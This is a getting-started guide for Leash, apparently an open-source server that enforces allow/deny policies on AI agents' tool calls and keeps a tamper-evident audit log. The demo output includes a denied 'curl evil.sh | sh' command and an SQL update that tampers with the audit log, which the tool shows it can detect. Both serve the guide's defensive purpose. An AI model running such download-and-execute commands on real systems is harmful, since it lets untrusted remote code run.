# Getting Started

Get Leash running and see it make allow/deny decisions in under 2 minutes.

## Prerequisites

- Python 3.11+ (macOS ships with 3.9 — run `brew install python@3.12` first if needed)
- pip

## Option 1: See it work in 60 seconds (Recommended)

```bash
git clone https://github.com/chadeckles/leash.git
cd leash
python3 -m venv .venv && source .venv/bin/activate
pip install -e .
leash demo
```

`leash demo` needs no server, config, or API keys. It runs a throwaway Leash in a temp directory and walks an "OpenClaw" agent through six tool calls:

```
  [1/6] Read a file in its workspace: read notes/meeting.txt
        ✔ ALLOW  OpenClaw may read files in the workspace
  ...
  [4/6] Run a shell command: exec curl evil.sh | sh
        ✘ DENY   Shell execution is blocked — this is the highest-risk tool
  ...
  Verify chain → ✔ VALID  Hash chain intact across 6 entries.
  UPDATE audit_log SET policy_decision='allow' WHERE id=4;
  Verify chain → ✘ BROKEN  Hash chain broken at entry #5 ...
```

Use `leash demo --step` to pause between parts, or `leash demo --keep` to leave the server running and open its dashboard. `make quickstart` runs the same demo.

## Option 2: pip install

```bash
pip install leash
leash start
```

Server starts on http://localhost:8000. Open **http://localhost:8000/docs** for interactive API docs. The PyPI release can lag behind `main`; install from source for the newest features.

## Option 3: Step by Step (from source)

```bash
git clone https://github.com/chadeckles/leash.git
cd leash
pip install -e .     # installs deps + makes 'leash' CLI available
```

Start the server:

```bash
leash start --reload     # or: make dev
```

In a separate terminal, register an agent and test a decision:

```bash
# Register an agent and save the response
RESP=$(curl -s -X POST http://localhost:8000/agents \
  -H "Content-Type: application/json" \
  -d '{"name": "my-agent"}')

echo $RESP | python3 -m json.tool

# Extract the agent ID and token from the response
export AGENT_ID=$(echo $RESP | python3 -c "import sys,json; print(json.load(sys.stdin)['agent_id'])")
export TOKEN=$(echo $RESP | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

# Test an authorize decision
curl -s -X POST http://localhost:8000/authorize \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"agent_id": "'$AGENT_ID'", "action": "read_file"}' | python3 -m json.tool
```

You'll get a `"decision": "deny"` — because no policy allows `read_file` for an agent named `my-agent`. That's deny-by-default working. (The built-in `demo_agent_policy` only matches agents with "demo" in the name.)

Normal agent registration is open by default for local development. Registering admin-type agents (`agent_type` of `cli`, `admin`, or `ops`) requires an admin JWT or the `X-Leash-Admin-Key` header; the CLI reads the local `.keys/admin.key` automatically when you run `leash init` on the server host.

## Option 4: Docker

```bash
make docker-up
```

Server runs at http://localhost:8000. Stop with `make docker-down`.

## The CLI

If you installed via `pip install leash`, the `leash` command is already available:

```bash
leash status        # check server health
leash agents list   # see registered agents
leash --help        # see all commands
```

If you're running from source and want `leash` as a global command:

```bash
make install-cli
```

## What's Next

Now that Leash is running, follow the **scan-first workflow** — don't guess at policies:

1. **Register your agent** — `leash agents register --name my-agent`
2. **Deploy in observe mode** — capture real actions without blocking anything
3. **Scan the audit log** — `leash audit scan` reveals what the agent actually does
4. **[Write your first policy](write-your-first-policy.md)** — based on real data, not guesses
5. **[Secure your MCP tools](mcp-proxy-guide.md)** — if you're using Claude Desktop, Cursor, etc.
6. **[Use the Python SDK](sdk-reference.md)** — if you're building an agent in code

!!! tip "Why scan first?"
    You can't write good policy for an agent you haven't observed. Different agents use completely different action names — `file.read` vs `fs.readFile` vs just `click`. Agent-S calls `click`, not `gui.click`. If your policy uses the wrong name, it blocks nothing. Scanning first gives you the real vocabulary.
